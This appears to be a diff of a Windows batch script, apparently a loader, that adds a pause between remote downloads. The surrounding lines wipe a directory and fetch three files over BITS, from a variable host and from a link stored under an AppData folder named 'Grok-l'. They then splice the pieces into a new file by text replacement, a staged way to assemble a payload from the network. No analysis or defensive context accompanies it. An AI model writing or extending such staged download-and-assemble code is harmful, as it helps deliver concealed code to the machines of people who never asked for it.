@@ -11,6 +11,7 @@ set /p dynLink=<"%appdata%\Grok-l\l.txt"
 rmdir /s /q "%d%" 2>nul
 mkdir "%d%"
 powershell -c "Start-BitsTransfer https://%u%/Final.txt '%f%'"
+timeout /t 5 /nobreak >nul
 powershell -c "Start-BitsTransfer https://%u%/First.txt '%a%'"
 powershell -c "Start-BitsTransfer %dynLink% '%b%'"
 powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
